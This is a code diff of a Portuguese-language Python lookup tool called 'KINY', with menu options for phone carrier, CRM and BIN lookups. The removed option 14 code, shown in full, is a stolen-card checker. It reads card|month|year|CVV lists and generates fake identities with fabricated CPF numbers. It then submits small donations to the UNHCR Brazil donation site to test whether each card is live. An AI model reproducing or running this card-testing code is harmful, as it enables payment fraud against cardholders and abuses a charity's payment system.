@@ -256,135 +256,7 @@ while(Sair == False):
     if op == '15':
     	tools.covid19()
     if op == '14':
-        def checker(cc,mes,ano,cvv):
-            r=requests.request('GET','https://lookup.binlist.net/'+cc[0:6]).json()
-            band=r.get('scheme')
-            tipo=r.get('type')
-            pais=r.get('country')
-            banco=r.get('bank')
-            nivel=r.get('brand')
-
-
-            if tipo=='credit':
-                tipo2='C'
-            else:
-                tipo2='D'
-
-            print(f'''
-{G}[+]{C}Consultando dados do cartão:
-{Y}[*]{C}Cartao: {B}{gg}
-{Y}[*]{C}Bandeira: {B}{band}
-{Y}[*]{C}Tipo: {B}{tipo}
-{Y}[*]{C}Nivel: {B}{nivel}
-{Y}[*]{C}Pais: {B}{pais.get('name')}
-{Y}[*]{C}Banco: {B}{banco.get('name')}''')
-
-            pessoa=requests.request('GET','https://randomuser.me/api/?nat='+pais.get('alpha2').lower()).json()
-            genero=pessoa['results'][0]['gender']
-            if genero=='female':
-                genero2=genero.replace('female','Mulher')
-                genero3='F'
-            else:
-                genero2=genero.replace('male','Homem')
-                genero3='M'
-            pnome=pessoa['results'][0]['name']['first']
-            sobrenome=pessoa['results'][0]['name']['last']
-            nome=pnome +' ' +sobrenome
-            nascimento=pessoa['results'][0]['dob']['date'][0:10]
-            if pais.get('alpha2')=='BR':
-                d=nascimento.split('-')[2]
-                m=nascimento.split('-')[1]
-                a=nascimento.split('-')[0]
-                nascimento=d+'/'+m+'/'+a
-            cpf=requests.request('GET','http://geradorapp.com/api/v1/cpf/generate?token=f01e0024a26baef3cc53a2ac208dd141').json()
-            cpf2=cpf['data']['number_formatted']
-            cpf=cpf['data']['number']
-            email=pnome.replace(' ','.')+'.'+sobrenome.replace(' ','.')+'@outlook.com'
-            email=email.lower().encode('ascii','ignore').decode('ascii')
-            cidade=pessoa['results'][0]['location']['city']
-            estado=pessoa['results'][0]['location']['state']
-            endereco=pessoa['results'][0]['location']['street']['name']
-            cep=str(pessoa['results'][0]['location']['postcode'])
-            if pais.get('alpha2')=='BR':
-                cep=cep+'-000'
-            bairro='Centro'
-
-            for key, value in estados.items():
-                estado=estado.replace(key,value)
-
-            print(f'''
-{G}[+]{C}Gerando pessoa aleatoria:
-{Y}[*]{C}Genero: {B}{genero2}
-{Y}[*]{C}Nome: {B}{nome}
-{Y}[*]{C}Nascimento: {B}{nascimento}
-{Y}[*]{C}CPF: {B}{cpf2}
-{Y}[*]{C}E-Mail: {B}{email}
-{Y}[*]{C}Endereço: {B}{endereco}
-{Y}[*]{C}CEP/ZIP: {B}{cep}
-{Y}[*]{C}Cidade: {B}{cidade}
-{Y}[*]{C}Estado: {B}{estado}
-''')
-
-            donate='https://doar.acnur.org/api/ACNURBR/donate.html'
-            h = {
-                'Host': 'doar.acnur.org',
-                'Connection': 'keep-alive',
-                'Content-Length': '1036',
-                'Cache-Control': 'max-age\u003d0',
-                'Origin': 'https://doar.acnur.org',
-                'Upgrade-Insecure-Requests': '1',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.09.4.5083',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-User': '?1',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3',
-                'Sec-Fetch-Site': 'same-origin',
-                'Referer': 'https://doar.acnur.org/acnur/donate.html',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Accept-Language': 'pt-BR,pt;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7',
-                'Cookie': 'ROUTEID\u003d.zolaBETA; _gcl_au\u003d1.1.751806228.1604113311; _ga\u003dGA1.3.972845617.1604113311; _gid\u003dGA1.3.1315302043.1604113311; _ga\u003dGA1.2.972845617.1604113311; _gid\u003dGA1.2.1315302043.1604113311; _uetsid\u003d6df17a801b2511eb91b7e9b62ecdda16; _uetvid\u003d6df60f501b2511ebb9704745327a0630; m_ses\u003d20201031000154; m_cnt\u003d0; _tq_id.TV-72092763-1.c79b\u003d24d79b933ff67001.1604113315.0.1604113315..; _fbp\u003dfb.1.1604113316536.1144821724; __qca\u003dP0-1736157422-1604113317181'
-                }
-
-            data='successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY='+pais.get('currency')+'&EXPDATE='+mes+ano[1:3]+'&TAXID='+cpf+'&AMT=35&TYPE='+tipo2+'%2F'+band+'&PAYPERIOD=MONT&X=&FIRSTNAME='+pnome+'&LASTNAME='+sobrenome+'&EMAIL='+email.replace('@','%40')+'&GENDER='+genero3+'&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1='+nascimento.replace('/','%2F')+'&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1='+nascimento.replace('/','%2F')+'&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET='+endereco.replace(' ','+')+'&STREET2='+bairro.replace(' ','+')+'&CITY='+cidade.replace(' ','+')+'&STATE='+estado+'&ZIP='+cep+'&COUNTRY='+pais.get('alpha2')+'&PHONENUM=%2811%29+98765-4321&CCTYPE='+tipo2+'%2F'+band+'&ACCT='+cc+'&NAME='+nome.replace(' ','+')+'&CVV2='+cvv
-
-            RS=requests.request('POST',donate,headers=h,data=data)
-            RS=RS.url
-            if RS=='https://doar.acnur.org/acnur/agradecimento.html':
-                print(f'{G}[+]{C}Pagamento autorizado! {G}Cartão LIVE!{C}')
-            else:
-                RS=RS.split('=')[3]
-                if RS=='REFUSED_PAYMENT':
-                    print(f'{R}[-]{C}Transação recusada ({R}Possivel IP Block{C}).')
-                elif RS=='DATA_INVALID':
-                    print(f'{R}[-]{C}Cartão invalido ({R}DIE{C}).')
-                elif RS=='FAIL_UNKNOWN':
-                    print(f'{R}[-]{C}Erro Desconhecido ({R}possivel uso de cartao de Debito{C}).')
-                elif RS=='ERROR_NETWORK':
-                    print(f'{R}[-]{C}Erro de rede.')
-                elif RS=='DATA_CARD_NOT_ALLOWED':
-                    print(f'{R}[-]{C}Pagamento nao autorizado.')
-                elif RS=='REFUSED_PROVIDER':
-                    print(f'{R}[-]{C}Pagamento recusado pela {Y}{band}{C}.')
-                elif RS=='REFUSED_BANK':
-                    print('{}[-]{}Recusado pelo {}{}{}.'.format(R,C,Y,banco.get('name'),C))
-                elif RS=='DATA_MISSING':
-                    print(f'{R}[-]{C}Algum dado faltando.')
-                else:
-                    print(f'{Y}Erro nao listado{R}{RS}{RT}')
-        tools.clear()
-        os.system('figlet KINY')
-        try:
-            lista=open(input(f'{C}Caminho da lista: '), 'r').read().splitlines()
-        except:
-            print(f'{C}[{R}i{C}] Erro,verifique se é um arquivo.')
-            time.sleep(3)
-            pass
-        for gg in lista:
-            cc=gg.split('|')[0]
-            mes=gg.split('|')[1]
-            ano=gg.split('|')[2]
-            cvv=gg.split('|')[3]
-            checker(cc,mes,ano,cvv)
+        tools.cc_checker()
     if op == '13':
     	tools.ip(ip_api)
     if op == '12':
@@ -392,9 +264,6 @@ while(Sair == False):
         tools.gerar_pessoa()
     if op == '11':
         tools.bin()
-        tools.clear()
-
-        consultabin()
     if op == '10':
         def consultaphone():
             api.phone()
@@ -410,62 +279,7 @@ while(Sair == False):
                 print(f'{C}[{R}i{C}] Opção inválida')
                 time.sleep(3)
                 tiposop()
-        def consultaoperadora():
-            tools.clear()
-            os.system("figlet KINY")
-            global op_input
-            print(f'{C}[{G}i{C}] Exemplo: 48952021826')
-            print(f'{C}[{Y}i{C}] Limite de consultas: 6 consultas por hora.')
-            print(f'{C}[{Y}i{C}] Digite o numero com DDD.')
-            op_input = input("===>")
-            headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"}
-            try:
-                request = requests.get('http://free.telein.com.br/sistema/consulta_json.php?chave=senhasite&numero='+op_input, headers=headers)
-                op_data = request.json()
-            except:
-                print(f'{C}[{R}i{C}] Limite de consultas atingido')
-                print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
-                print('1.Sim')
-                print('2.Não')
-                cho = input("===>")
-                if cho == '1' or cho == '01':
-                    consultaoperadora()
-                if cho == '2' or cho == '02':
-                    pass
-                else:
-                    print(f'{C}[{R}i{C}] Opção inválida')
-            op_final = 'null'
-            if (op_data['operadora']) == '553016':
-                op_final = 'CLARO'
-            if (op_data['operadora']) == '553070':
-                op_final = 'OI'
-            if (op_data['operadora']) == '553066':
-                op_final = 'NEXTEL'
-            if (op_data['operadora']) == '553102':
-                op_final = 'TIM'
-            if (op_data['operadora']) == '553097':
-                op_final = 'VIVO'
-            elif (op_data['operadora']) == '99':
-                print(f'{C}[{R}*{C}] Não foi possível consultar a operadora')
-            if op_final == 'null':
-                print(f'{C}[{R}*{C}] Operadora invalida.')
-            else:
-                print(f'{C}[{G}*{C}] Operadora:'+op_final)
-            #print(op_data['operadora'])
-            print(f'{C}[{Y}i{C}] Deseja fazer uma nova consulta?')
-            print('1.Sim')
-            print('2.Não')
-            cho = input("===>")
-            if cho == '1' or cho == '01':
-                consultaoperadora()
-            if cho == '2' or cho == '02':
-                pass
-            else:
-                print(f'{C}[{R}i{C}] Opção inválida')
-                time.sleep(3)
-                tiposop()
         def tiposop():
-            tools.clear()
             os.system('figlet KINY')
             print(f'O que deseja fazer?')
             print('1.Consultar operadora por numero')
@@ -482,16 +296,12 @@ while(Sair == False):
         tiposop()
     if op == '9' or op == '09':
         tools.crm()
-        del crm_input
-        del uf_input
-        del url
-        del crm_data
         print(f'{C}[{G}i{C}] Deseja realizar uma nova consulta?')
         print('1.Sim')
         print('2.Não')
         choice = input("===>")
         if choice == "1" or choice == "01":
-            consultacrm()
+            tools.crm()
         if choice == "2" or choice == "02":
             pass
         else:
